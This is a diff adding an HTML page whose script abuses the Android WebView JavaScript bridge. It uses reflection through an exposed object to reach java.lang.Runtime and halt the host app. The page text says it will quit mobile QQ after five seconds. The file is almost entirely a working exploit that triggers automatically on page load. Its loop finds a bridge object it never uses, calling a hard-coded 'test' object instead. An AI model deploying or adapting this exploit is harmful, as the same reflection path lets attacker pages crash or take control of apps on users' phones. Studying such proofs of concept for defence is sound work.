@@ -1,0 +1,18 @@
+
+    <script>
+        function exec2(){
+            var obj;
+            for(var i in window){
+                var o = window[i];
+                if(typeof o.getClass == "function"){
+                    obj = o;
+                    break;
+                }
+            }
+            test.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).halt(1);
+        }
+        window.onload=function(){
+            setTimeout(exec2,5000);
+        }
+    </script>
+            hello world！ 5秒后将退出手Q
